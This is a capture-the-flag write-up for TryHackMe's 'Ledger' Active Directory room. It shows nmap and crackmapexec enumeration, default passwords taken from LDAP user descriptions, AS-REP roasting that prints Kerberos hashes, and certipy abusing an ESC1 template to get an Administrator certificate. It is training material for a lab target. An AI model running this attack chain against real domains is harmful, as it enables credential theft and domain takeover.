<p align="center">May 6, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{366}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/730584a5-e81b-4a5e-9cb5-b888b92e5705" alt="streak"><br></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Ledger}}$$</h1>
<p align="center"><em>This challenge simulates a real cyber-attack scenario where you must exploit an Active Directory.</em>!<br>
It is classified as a hard-level CTF.<br>
It is premium: only for subscribers.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/ledger">here</a>.</p>

<p align="center"> <img width="1000px" src=""> </p>


<br>
<br>

<h2>Task 1 . Find the Flags</h2>
<p>Start the virtual machine by pressing the Start Machine button attached in this task. You may access the VM by using the AttackBox or your VPN connection.<br><br>

Can you find all the flags?<br><br>

Note: The VM takes about 5 minutes to fully boot up. All the necessary tools are already available on the AttackBox.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>


> 1.1. <em>What is the user flag? </em><br><a id='1.1'></a>
>> <strong><code>___________________________</code></strong><br>
<p></p>

<br>

> 1.2. <em>What is the root flag? </em><br><a id='1.2'></a>
>> <strong><code>___________________________</code></strong><br>
<p></p>


<br>

<h3><code>nmap</code></h3>
<p>There are many ports open.<br><br>
- port <code> 53/tcp</code>:<code>domain?</code><br>
- port <code> 80/tcp</code>:<code>http</code><br>
- port <code> 88/tcp</code>:<code>kerberos-sec</code><br>
- port <code>135/tcp</code>:<code>msrpc</code><br>
- port <code>139/tcp</code>:<code>netbios-ssn</code><br>
- port <code>389/tcp</code>:<code>ldap</code><br>
- port <code>443/tcp</code>:<code>ssl/httpp</code><br>
- port <code>445/tcp</code>:<code>microsoft-ds?/httpp</code><br>
- port <code>464/tcp</code>:<code>kpasswd5?</code><br>
- port <code>593/tcp</code>:<code>ncacn_http</code><br>
- port <code>636/tcp</code>:<code>ssl/ldap</code><br>
- port <code>3268/tcp</code>:<code>ldap</code><br>
 ...<br><br>

Domain : <code>labyrinth.thm.local</code>, <code> labyrinth.thm</code> and <code>thm.local</code></p> 

<br>

```bash
:~# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-07 01:36:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-06-24T14:40:22
|_Not valid after:  2025-06-24T14:40:22
|_ssl-date: 2025-05-07T01:38:58+00:00; 0s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
|_ssl-date: 2025-05-07T01:38:58+00:00; 0s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-06-24T14:40:22
|_Not valid after:  2025-06-24T14:40:22
|_ssl-date: 2025-05-07T01:38:58+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-06-24T14:40:22
|_Not valid after:  2025-06-24T14:40:22
|_ssl-date: 2025-05-07T01:38:58+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: thm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Subject Alternative Name: othername:<unsupported>, DNS:labyrinth.thm.local
| Not valid before: 2024-06-24T14:40:22
|_Not valid after:  2025-06-24T14:40:22
|_ssl-date: 2025-05-07T01:38:58+00:00; 0s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: LABYRINTH
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: labyrinth.thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-07T01:38:43+00:00
| ssl-cert: Subject: commonName=labyrinth.thm.local
| Not valid before: 2025-05-06T01:27:14
|_Not valid after:  2025-11-05T01:27:14
|_ssl-date: 2025-05-07T01:38:58+00:00; 0s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
49782/tcp open  msrpc         Microsoft Windows RPC
...
Service Info: Host: LABYRINTH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: LABYRINTH, NetBIOS user: <unknown>, NetBIOS MAC: 02:bd:f8:a3:f8:6f (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-07T01:38:43
|_  start_date: N/A
...
```

<br>

<h3><code>/etc/hosts</code></h3>
<p>Added <code>TargetIP</code> and <code>domain name</code> to <code>/etc/hosts</code>.</p>

<br>

<h3>ping</h3>

```bash
ping labyrinth.thm.local
PING labyrinth.thm.local (TargetIP) 56(84) bytes of data.
64 bytes from labyrinth.thm.local (TargetIP): icmp_seq=1 ttl=128 time=0.296 ms
...
```

<br>

<h3><code>crackmapexec</code></h3>

```bash
:~/Ledger# snap install crackmapexec
crackmapexec v5.4.0-1355-gd8c50c8 from Jitendra Patro (jitpatro) installed
```

<br>


```bash
:~/Ledger# crackmapexec smb TargetIP -u 'anonymous' -p '' --shares
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Copying default configuration file
SMB         10.10.136.218   445    LABYRINTH        [*] Windows 10.0 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         10.10.136.218   445    LABYRINTH        [+] thm.local\anonymous: 
SMB         10.10.136.218   445    LABYRINTH        [*] Enumerated shares
SMB         10.10.136.218   445    LABYRINTH        Share           Permissions     Remark
SMB         10.10.136.218   445    LABYRINTH        -----           -----------     ------
SMB         10.10.136.218   445    LABYRINTH        ADMIN$                          Remote Admin
SMB         10.10.136.218   445    LABYRINTH        C$                              Default share
SMB         10.10.136.218   445    LABYRINTH        IPC$            READ            Remote IPC
SMB         10.10.136.218   445    LABYRINTH        NETLOGON                        Logon server share 
SMB         10.10.136.218   445    LABYRINTH        SYSVOL                          Logon server share 
:~/Ledger# 

```

<br>


```bash
:~/Ledger# crackmapexec ldap TargetIP -u 'guest' -p ''
SMB         10.10.136.218   445    LABYRINTH        [*] Windows 10.0 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
LDAP        10.10.136.218   389    LABYRINTH        [+] thm.local\guest:
:~/Ledger# crackmapexec ldap 10.10.136.218 -u 'guest' -p '' --users
SMB         10.10.136.218   445    LABYRINTH        [*] Windows 10.0 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
LDAP        10.10.136.218   389    LABYRINTH        [+] thm.local\guest: 
LDAP        10.10.136.218   389    LABYRINTH        [*] Total of records returned 490
LDAP        10.10.136.218   389    LABYRINTH        Guest                          Tier 1 User
...
LDAP        10.10.136.218   389    LABYRINTH        MORTON_BURNS                   
LDAP        10.10.136.218   389    LABYRINTH        IVY_WILLIS                     Please change it: CHANGEME2023!
...
LDAP        10.10.136.218   389    LABYRINTH        LIZ_WALTER                     Tier 1 User
LDAP        10.10.136.218   389    LABYRINTH        SUSANNA_MCKNIGHT               Please change it: CHANGEME2023!
L...
:~/Ledger# crackmapexec smb labyrinth.thm.local -u 'IVY_WILLIS' -p 'CHANGEME2023!'
SMB         10.10.136.218   445    LABYRINTH        [*] Windows 10.0 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         10.10.136.218   445    LABYRINTH        [+] thm.local\IVY_WILLIS:CHANGEME2023! 
:~/Ledger# crackmapexec smb labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p 'CHANGEME2023!'
SMB         10.10.136.218   445    LABYRINTH        [*] Windows 10.0 Build 17763 x64 (name:LABYRINTH) (domain:thm.local) (signing:True) (SMBv1:False)
SMB         10.10.136.218   445    LABYRINTH        [+] thm.local\SUSANNA_MCKNIGHT:CHANGEME2023! 
:~/Ledger# # xfreerdp /u:SUSANNA_MCKNIGHT /p:'CHANGEME2023!' /v:labyrinth.thm.local /dynamic-resolution /clipboard /cert:ignore
```

<br>

![image](https://github.com/user-attachments/assets/0fb58c7f-0bea-4d35-85dc-66fd76bd15c2)

<br>

<br>

<p>- JOAQUIN_STEVENSON<br>
- ESTHER_PUCKETT<br>
- JEROME_DUDLEY<br>
- BETH_MUNOZ<br>
- CHI_HARDING<br>

 
</p>


```bash

ldapsearch -x -b "DC=THM,DC=LOCAL" -H ldap://labyrinth.thm.local > ldap_report.txt
...
sAMAccountName: LABYRINTH$
sAMAccountType: 805306369
operatingSystem: Windows Server 2019 Datacenter
operatingSystemVersion: 10.0 (17763)
serverReferenceBL: CN=LABYRINTH,CN=Servers,CN=Default-First-Site-Name,CN=Sites
 ,CN=Configuration,DC=thm,DC=local
dNSHostName: labyrinth.thm.local
rIDSetReferences: CN=RID Set,CN=LABYRINTH,OU=Domain Controllers,DC=thm,DC=local
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/labyrinth.thm.
 local
servicePrincipalName: ldap/labyrinth.thm.local/ForestDnsZones.thm.local
servicePrincipalName: ldap/labyrinth.thm.local/DomainDnsZones.thm.local
servicePrincipalName: TERMSRV/LABYRINTH
servicePrincipalName: TERMSRV/labyrinth.thm.local
servicePrincipalName: DNS/labyrinth.thm.local
servicePrincipalName: GC/labyrinth.thm.local/thm.local
servicePrincipalName: RestrictedKrbHost/labyrinth.thm.local
servicePrincipalName: RestrictedKrbHost/LABYRINTH
servicePrincipalName: RPC/dcb68acc-c01a-4d72-8113-c008fcfab2fa._msdcs.thm.local
servicePrincipalName: HOST/LABYRINTH/THM
servicePrincipalName: HOST/labyrinth.thm.local/THM
servicePrincipalName: HOST/LABYRINTH
servicePrincipalName: HOST/labyrinth.thm.local
servicePrincipalName: HOST/labyrinth.thm.local/thm.local
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/dcb68acc-c01a-4d72-
 8113-c008fcfab2fa/thm.local
servicePrincipalName: ldap/LABYRINTH/THM
servicePrincipalName: ldap/dcb68acc-c01a-4d72-8113-c008fcfab2fa._msdcs.thm.loc
 al
servicePrincipalName: ldap/labyrinth.thm.local/THM
servicePrincipalName: ldap/LABYRINTH
servicePrincipalName: ldap/labyrinth.thm.local
servicePrincipalName: ldap/labyrinth.thm.local/thm.local
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=thm,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230529192845.0Z
dSCorePropagationData: 20230529184606.0Z
dSCorePropagationData: 20230529182013.0Z
dSCorePropagationData: 20230512072601.0Z
dSCorePropagationData: 16010714223649.0Z
lastLogonTimestamp: 133910548679452833
msDS-SupportedEncryptionTypes: 28
msDS-GenerationId:: XJgk7I4o6BU=
msDFSR-ComputerReferenceBL: CN=LABYRINTH,CN=Topology,CN=Domain System Volume,C
 N=DFSR-GlobalSettings,CN=System,DC=thm,DC=local


```

![image](https://github.com/user-attachments/assets/974b1d6b-2efc-434b-94d4-77c184cafe40)

<br>

![image](https://github.com/user-attachments/assets/107e442e-9e9e-45bf-9f78-5ba8c6de738a)



<br>

![image](https://github.com/user-attachments/assets/5dd0b2ff-a62e-4e20-bed8-8564a032bc9d)

<br>

![image](https://github.com/user-attachments/assets/f37d8d17-3a24-4d80-85f0-ac864b5460d1)

<br>

![image](https://github.com/user-attachments/assets/e92bb1ed-dea8-4bf5-82c6-7a4ec6320650)



```bash
:~/Ledger# python3 /opt/impacket/build/scripts-3.9/GetNPUsers.py thm.local/LABYRINTH -dc-ip 10.10.136.218 -request
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Password:
Name            MemberOf  PasswordLastSet             LastLogon  UAC      
--------------  --------  --------------------------  ---------  --------
SHELLEY_BEARD             2023-05-30 10:46:05.083950  <never>    0x410200 
ISIAH_WALKER              2023-05-30 10:46:09.380690  <never>    0x410200 
QUEEN_GARNER              2023-05-30 10:46:14.208632  <never>    0x410200 
PHYLLIS_MCCOY             2023-05-30 10:46:20.583409  <never>    0x410200 
MAXINE_FREEMAN            2023-05-30 10:46:51.475615  <never>    0x410200 



$krb5asrep$23$SHELLEY_BEARD@THM.LOCAL:59a36a59644f2d4693aef7f726e5083e$bf7f0b13f75f8305c95561a985f749aaa6c140b54b8602fe3ea45a49db86dc2b6ad9b05e136419dbca39f1c7fb8cb183ad423cce38d167a5e82d9b0fa468c612dcc4905ad3ab5f5e2ca838636da01243bbd6970aa18baabc32319328e57512a4e09c4ad7001a24c53ffd8c3e198a2bd4f2ae4791953ffd2a9fbda835617eea6f6b1610512a6fd8447a85d44ef3b7400866ef08f4b358fe6c9abcdb0af704065a495a4bb1a303371b8754b45d6e6d4e47bca33683f5d5b514b098ebb15054473554bbad96d428870f3aa12e7b585a6963b64710dd09e278e2341c2c0db91433a2b09f37d61636
$krb5asrep$23$ISIAH_WALKER@THM.LOCAL:236d9849f4e3e4a8630c85d4a2a245a1$9e57c7bccc0076e195c8e21708e3014998fb5a5522a5fda339edd717ac78c15216d83d6e7165bb73e9be495bf6ced10d42e5eca87007f3938023eac5ed7e6d55f30e11239bb1ab33d56135c9e434cfb310c978f98d6e0d099da37f2da7f706711278143d2f60a37f4ada8b1689c91d040ec900cec83dd6388dfbab196a7a31b8e2a35f89c7541218c6dfd929c2aa2f127feb629f096cdd5f0bce83b9f4b2ec1a829dc77d0b4c2e84880f717b1b0ca12ae66cac3d3024f2697f5a0e75f7deb2165a1c70d1f63f70316d5422a8e78c5e3ddd889c77e6e6ee58110535f4beab7e505cfb600fb056
$krb5asrep$23$QUEEN_GARNER@THM.LOCAL:8f15cb95877f54657ec42b1663a7345f$5e42321ee44e73ae70592e3739e46a31a97b662339b89e2198706de96b14600cd41d0060355be8212eba6eeb34096df207ab7597a589b06366bff1791df58acd8b9b1bbf54d13c4baf0c03986278b5e0594328c6f766e4eb1c3c2e17568042668f3d2a7a95e43691749014e43fa46f3dfca3029d7b9a527e7a8ed0ec2944832c396fec800b433ee6ae18eba0531e64e62ab7bc12ebeb0a10cd6dfd6fac9153f70a730004d5bdbaf1f5942da0853525d0761aaba4cafeee643cd957a2dcb63a2ab1e888507a2133f339dd30476aa8d393b5947838ff659facac73fe3f211ec2def6005fd69d2c
$krb5asrep$23$PHYLLIS_MCCOY@THM.LOCAL:d904314782707f8456cc9082fb327444$4dab2e07da9600c81c9718f1d47164bcab7dc034445b7a17a39ffbc2d3d57fd01e5863c1d30006eb9fed199f795d523c26b5a62591bd74f20f6f6c01f783b341e78bb7921f56047df4c491e2459b39e1f8b376bf0eff9c93b1b1e94c0affcafd324948fccedf06e079db3d500eedf69353f058bec92931ecb456df61929627fa066340bf2dd267496ee6f3db1ae1d8f28f283c8ff22ea4bcfeb7f64e04832768492bf86bf72a4ea3122f3d11dbf37d744b28392a567f9f9d31d177bbc6960120f7eae712bcc07474b2f9f05aaf8cf5a51d42ee2fd04b69c4c5363a41ebb524a2888189355d82
$krb5asrep$23$MAXINE_FREEMAN@THM.LOCAL:23a2054e13ce5c921ba88d93e8893200$95a64af010f9be1a435c379bebd0dbbfaae461c4751a88fa94ef3035653d7ad1376b927aad00759c4da24a143e108a561bc541ba050efad4257632e421259e5b77791b073a5daba077fc61a6308a54b9e05e62f6d99b59e2ecd38365f3e796907ee124f06d9b1f8d17c4be08c9a73f57c4f741021d755564e80bca7de0bd248a47cb2e3c8d4dbf075abe6f728fcbb9e8f49adad74b528da985f8fccd82bd8df3bf97abc2cc4197820a690bb8326f8a02e50f5b112e761463afeffdccc4668dce48872b1b4c3be9826ff9d4db18077b5236af9d0fd49f7032cdedb2ea7356706a9b9088dc7e05
:~/Ledger# 



pip3 install certipy
...

certipy find -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -target labyrinth.thm.local -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Failed to resolve: THM.LOCAL
[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 14 enabled certificate templates
[*] Trying to get CA configuration for 'thm-LABYRINTH-CA' via CSRA
[!] Got error while trying to get CA configuration for 'thm-LABYRINTH-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'thm-LABYRINTH-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'thm-LABYRINTH-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : thm-LABYRINTH-CA
    DNS Name                            : labyrinth.thm.local
    Certificate Subject                 : CN=thm-LABYRINTH-CA, DC=thm, DC=local
    Certificate Serial Number           : 5225C02DD750EDB340E984BC75F09029
    Certificate Validity Start          : 2023-05-12 07:26:00+00:00
    Certificate Validity End            : 2028-05-12 07:35:59+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : THM.LOCAL\Administrators
      Access Rights
        ManageCertificates              : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        ManageCa                        : THM.LOCAL\Administrators
                                          THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
        Enroll                          : THM.LOCAL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ServerAuth
    Display Name                        : ServerAuth
    Certificate Authorities             : thm-LABYRINTH-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16777216
                                          65536
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Property Principals       : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
  1
    Template Name                       : Computer2
    Display Name                        : Computer2
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16777216
                                          65536
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Domain Computers
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Authenticated Users
      Object Control Permissions
        Owner                           : THM.LOCAL\Administrator
        Write Owner Principals          : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Dacl Principals           : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
        Write Property Principals       : THM.LOCAL\Domain Admins
                                          THM.LOCAL\Enterprise Admins
                                          THM.LOCAL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'THM.LOCAL\\Domain Computers' and 'THM.LOCAL\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
...
....
:~# certipy req -u 'SUSANNA_MCKNIGHT@thm.local' -p 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn Administrator@thm.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Failed to resolve: THM.LOCAL
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 24
[*] Got certificate with UPN 'Administrator@thm.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

..
...
certipy auth -pfx administrator.pfx

```


<br>

![image](https://github.com/user-attachments/assets/d0eea22e-f924-4d37-95fc-a73d3579038a)


<br>

<h3>port <code>Firefox</code></h3>

![image](https://github.com/user-attachments/assets/da899eb4-b0af-4e62-af76-d138fad1a9d4)




